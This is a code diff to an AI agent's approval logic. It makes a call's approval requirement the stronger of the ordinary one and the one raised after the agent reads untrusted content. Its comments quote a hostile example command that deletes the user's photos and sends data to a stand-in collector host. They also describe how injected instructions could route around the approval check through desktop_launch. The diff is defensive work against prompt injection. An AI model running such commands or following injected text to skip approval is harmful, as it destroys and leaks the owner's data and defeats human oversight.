@@ -2039,6 +2039,27 @@ const shellDestinations = (args: Record<string, unknown>): string[] => {
 };
 
 /**
+ * Every address one tool call would reach, whichever tool it is.
+ *
+ * One list, because two of them drift: the approval floor asks what a call reaches in order to
+ * judge it, and the turn's novelty budget asks the same question in order to charge it, and an
+ * address only one of them knows about is either an unjudged request or an unpaid one. A batch is
+ * twenty-four actions wearing one action name, so the navigate inside one is here too.
+ */
+export const callDestinations = (name: string, args: Record<string, unknown>): string[] => {
+  if (name === 'parallel_web_read') return Array.isArray(args.urls) ? args.urls.map(String) : [];
+  if (name === 'browser_action')
+    return [
+      textValue(args.url),
+      ...(Array.isArray(args.actions)
+        ? args.actions.map((step) => textValue((step as { url?: unknown } | null)?.url))
+        : [])
+    ].filter(Boolean);
+  if (name === 'shell' || name === 'desktop_launch') return shellDestinations(args);
+  return [];
+};
+
+/**
  * Where the browser and the network-reaching commands drop what they fetched.
  *
  * Everything under it is bytes somebody else wrote, sitting in the owner's own workspace, which is
@@ -2276,11 +2297,55 @@ export interface ApprovalContext {
   taintSources?: readonly string[];
   /** Hosts the owner named, a search returned, or this turn already read. */
   knownOrigins?: readonly string[];
+  /** The whole addresses behind those hosts, so a link the turn was handed is not novel material. */
+  knownAddresses?: readonly string[];
   /** The owner's own words this task, for the destination policy's novelty bound. */
   ownerText?: string;
   /** This installation's own address, which is not a destination data can leave by. */
   selfOrigins?: readonly string[];
+  /** What this turn has already sent that appears nowhere the owner put it, in bytes. */
+  spentNoveltyBytes?: number;
 }
+
+interface ApprovalRequirement {
+  sideEffect: 'workspace_write' | 'external_reversible' | 'external_consequential';
+  action: string;
+  preview: string;
+}
+
+const APPROVAL_RANK: Record<ApprovalRequirement['sideEffect'], number> = {
+  workspace_write: 0,
+  external_reversible: 1,
+  external_consequential: 2
+};
+
+/**
+ * The stronger of what the turn's provenance raises and what the call would need anyway.
+ *
+ * Reading a hostile page may only ever raise the floor, and it was lowering it. The taint block
+ * returned first, so its card *replaced* the ordinary one: measured against the shipped classifier,
+ * `bash -lc 'rm -rf ~/photos && curl https://collector.invalid/?q=…'` came back as an
+ * external_reversible "Allow this command to collector.invalid" where the same command on a clean
+ * turn is external_consequential "Run bash", and a browser upload of a workspace file to an unnamed
+ * host lost its consequential card at exactly the moment the turn became dangerous. Both facts are
+ * true and the owner is only asked once, so both are shown.
+ */
+const strongestRequirement = (
+  raised: ApprovalRequirement | null,
+  ordinary: ApprovalRequirement | null
+): ApprovalRequirement | null => {
+  if (!raised) return ordinary;
+  if (!ordinary) return raised;
+  const strongest =
+    APPROVAL_RANK[ordinary.sideEffect] > APPROVAL_RANK[raised.sideEffect] ? ordinary : raised;
+  return {
+    ...strongest,
+    preview:
+      raised.preview === ordinary.preview
+        ? strongest.preview
+        : `${raised.preview}\n\n${ordinary.preview}`
+  };
+};
 
 const destinationCard = (
   verdicts: readonly DestinationVerdict[],
@@ -2302,85 +2367,98 @@ const destinationCard = (
   ].join('\n')
 });
 
+/**
+ * What the turn's own provenance raises, on top of whatever the call would need anyway.
+ *
+ * It gates sinks and nothing else: a turn that reads forty pages and writes a report raises no
+ * extra card, because a card that fires on everything is a card nobody reads.
+ */
+const taintedRequirement = (
+  name: string,
+  args: Record<string, unknown>,
+  context: ApprovalContext,
+  taintSources: readonly string[]
+): ApprovalRequirement | null => {
+  const destinations = {
+    knownOrigins: context.knownOrigins ?? [],
+    knownAddresses: context.knownAddresses ?? [],
+    ownerText: context.ownerText ?? '',
+    selfOrigins: context.selfOrigins ?? [],
+    spentNoveltyBytes: context.spentNoveltyBytes ?? 0
+  };
+  if (name === 'parallel_web_read' || name === 'browser_action') {
+    const verdicts = callDestinations(name, args)
+      .map((url) => classifyDestination(url, destinations))
+      .filter((verdict) => verdict.sink);
+    if (verdicts.length)
+      return destinationCard(
+        verdicts,
+        taintSources,
+        name === 'browser_action' ? 'this page' : 'this read'
+      );
+  }
+  const durable = writtenPaths(name, args).filter(isDurableInstructionPath);
+  if (durable.length)
+    return {
+      sideEffect: 'workspace_write',
+      action: `Review a change to ${durable[0]}`,
+      preview: `${durable.join(', ')} is loaded ahead of every later task on this computer, so writing it while untrusted content is in the turn (${taintSources.slice(0, 3).join(', ')}) is shown to you first.`
+    };
+  if (name === 'publish_preview')
+    return {
+      sideEffect: 'external_reversible',
+      action: 'Publish a private preview from a turn that read untrusted content',
+      preview: `This turn has read untrusted content (${taintSources.slice(0, 3).join(', ')}). A preview link is reachable from outside this computer.`
+    };
+  /*
+   * `shell` and `desktop_launch` are the same act wearing two names.
+   *
+   * Both take an executable and arguments and run them on the owner's computer. Only `shell` was
+   * judged here, so on a turn that had already read untrusted content an injected instruction
+   * could reach `desktop_launch` and get a card-free duplicate of the command the floor would
+   * have stopped - and that one runs as the runner's own account rather than the sandboxed agent,
+   * so it was the better of the two to be handed.
+   */
+  if (name === 'shell' || name === 'desktop_launch') {
+    const verdicts = callDestinations(name, args)
+      .map((url) => classifyDestination(url, destinations))
+      .filter((verdict) => verdict.sink);
+    if (verdicts.length) return destinationCard(verdicts, taintSources, 'this command');
+    if (name === 'desktop_launch')
+      return {
+        sideEffect: 'external_consequential',
+        action: `Open ${textValue(args.executable, 'an application')} on the desktop`,
+        preview: `Launch ${[textValue(args.executable, 'an application'), ...(Array.isArray(args.args) ? args.args.map(String) : [])].join(' ')} on the agent computer's desktop, after this turn read untrusted content (${taintSources.slice(0, 3).join(', ')}).`
+      };
+    if (args.network === true)
+      return {
+        sideEffect: 'external_reversible',
+        action: `Allow internet access for ${textValue(args.executable, 'command')}`,
+        preview: `Run ${[textValue(args.executable, 'command'), ...(Array.isArray(args.args) ? args.args.map(String) : [])].join(' ')} with outbound network access, after this turn read untrusted content (${taintSources.slice(0, 3).join(', ')}).`
+      };
+  }
+  return null;
+};
+
 export const approvalRequirement = (
   name: string,
   args: Record<string, unknown>,
   securityMode: SecurityMode = 'balanced',
   context: ApprovalContext = {}
-): null | {
-  sideEffect: 'workspace_write' | 'external_reversible' | 'external_consequential';
-  action: string;
-  preview: string;
-} => {
+): ApprovalRequirement | null => {
   const taintSources = context.taintSources ?? [];
-  const tainted = taintSources.length > 0;
-  if (tainted) {
-    const destinations = {
-      knownOrigins: context.knownOrigins ?? [],
-      ownerText: context.ownerText ?? '',
-      selfOrigins: context.selfOrigins ?? []
-    };
-    if (name === 'parallel_web_read') {
-      const verdicts = (Array.isArray(args.urls) ? args.urls.map(String) : [])
-        .map((url) => classifyDestination(url, destinations))
-        .filter((verdict) => verdict.sink);
-      if (verdicts.length) return destinationCard(verdicts, taintSources, 'this read');
-    }
-    if (name === 'browser_action') {
-      // A batch is twenty-four actions wearing one action name, so the navigate inside one is
-      // judged too.
-      const urls = [
-        textValue(args.url),
-        ...(Array.isArray(args.actions)
-          ? args.actions.map((step) => textValue((step as { url?: unknown } | null)?.url))
-          : [])
-      ].filter(Boolean);
-      const verdicts = urls
-        .map((url) => classifyDestination(url, destinations))
-        .filter((verdict) => verdict.sink);
-      if (verdicts.length) return destinationCard(verdicts, taintSources, 'this page');
-    }
-    const durable = writtenPaths(name, args).filter(isDurableInstructionPath);
-    if (durable.length)
-      return {
-        sideEffect: 'workspace_write',
-        action: `Review a change to ${durable[0]}`,
-        preview: `${durable.join(', ')} is loaded ahead of every later task on this computer, so writing it while untrusted content is in the turn (${taintSources.slice(0, 3).join(', ')}) is shown to you first.`
-      };
-    if (name === 'publish_preview')
-      return {
-        sideEffect: 'external_reversible',
-        action: 'Publish a private preview from a turn that read untrusted content',
-        preview: `This turn has read untrusted content (${taintSources.slice(0, 3).join(', ')}). A preview link is reachable from outside this computer.`
-      };
-    /*
-     * `shell` and `desktop_launch` are the same act wearing two names.
-     *
-     * Both take an executable and arguments and run them on the owner's computer. Only `shell` was
-     * judged here, so on a turn that had already read untrusted content an injected instruction
-     * could reach `desktop_launch` and get a card-free duplicate of the command the floor would
-     * have stopped - and that one runs as the runner's own account rather than the sandboxed agent,
-     * so it was the better of the two to be handed.
-     */
-    if (name === 'shell' || name === 'desktop_launch') {
-      const verdicts = shellDestinations(args)
-        .map((url) => classifyDestination(url, destinations))
-        .filter((verdict) => verdict.sink);
-      if (verdicts.length) return destinationCard(verdicts, taintSources, 'this command');
-      if (name === 'desktop_launch')
-        return {
-          sideEffect: 'external_consequential',
-          action: `Open ${textValue(args.executable, 'an application')} on the desktop`,
-          preview: `Launch ${[textValue(args.executable, 'an application'), ...(Array.isArray(args.args) ? args.args.map(String) : [])].join(' ')} on the agent computer's desktop, after this turn read untrusted content (${taintSources.slice(0, 3).join(', ')}).`
-        };
-      if (args.network === true)
-        return {
-          sideEffect: 'external_reversible',
-          action: `Allow internet access for ${textValue(args.executable, 'command')}`,
-          preview: `Run ${[textValue(args.executable, 'command'), ...(Array.isArray(args.args) ? args.args.map(String) : [])].join(' ')} with outbound network access, after this turn read untrusted content (${taintSources.slice(0, 3).join(', ')}).`
-        };
-    }
-  }
+  return strongestRequirement(
+    taintSources.length ? taintedRequirement(name, args, context, taintSources) : null,
+    ordinaryRequirement(name, args, securityMode, context)
+  );
+};
+
+const ordinaryRequirement = (
+  name: string,
+  args: Record<string, unknown>,
+  securityMode: SecurityMode,
+  context: ApprovalContext
+): ApprovalRequirement | null => {
   if (name === 'schedule' && textValue(args.action) !== 'list')
     return {
       sideEffect: 'external_reversible',
@@ -2391,7 +2469,7 @@ export const approvalRequirement = (
           : `${textValue(args.action)} schedule ${textValue(args.id, 'unknown')}`
     };
   if (name === 'memory') {
-    const reason = memoryApprovalReason(args, new Date(), taintSources);
+    const reason = memoryApprovalReason(args, new Date(), context.taintSources ?? []);
     if (reason)
       return {
         sideEffect: 'workspace_write',
@@ -2607,21 +2685,28 @@ export const approvalRequirement = (
     // strongest requirement any of them raises is the one the owner answers.
     if (action === 'batch') {
       const steps = Array.isArray(args.actions) ? args.actions : [];
-      const rank = { workspace_write: 0, external_reversible: 1, external_consequential: 2 };
-      let strongest: ReturnType<typeof approvalRequirement> = null;
+      let strongest: ApprovalRequirement | null = null;
       steps.forEach((step, index) => {
         const bag = (step && typeof step === 'object' ? step : {}) as Record<string, unknown>;
         const type = surfaceActionVerb(bag);
         // The runner's own union has no nested batch; refusing to descend keeps this bounded
         // whatever arrives.
         if (!type || type === 'batch') return;
-        const requirement = approvalRequirement(
+        // The provenance half is deliberately not re-run per step: it already judged every address
+        // in the batch at once, and asking it again here would show the owner the same destination
+        // twice on one card.
+        const requirement = ordinaryRequirement(
           name,
           { ...bag, purpose: args.purpose },
-          securityMode
+          securityMode,
+          {}
         );
         if (!requirement) return;
-        if (strongest && rank[strongest.sideEffect] >= rank[requirement.sideEffect]) return;
+        if (
+          strongest &&
+          APPROVAL_RANK[strongest.sideEffect] >= APPROVAL_RANK[requirement.sideEffect]
+        )
+          return;
         strongest = {
           ...requirement,
           preview: `Step ${index + 1} of ${steps.length} in this batch (${type}):\n${requirement.preview}`
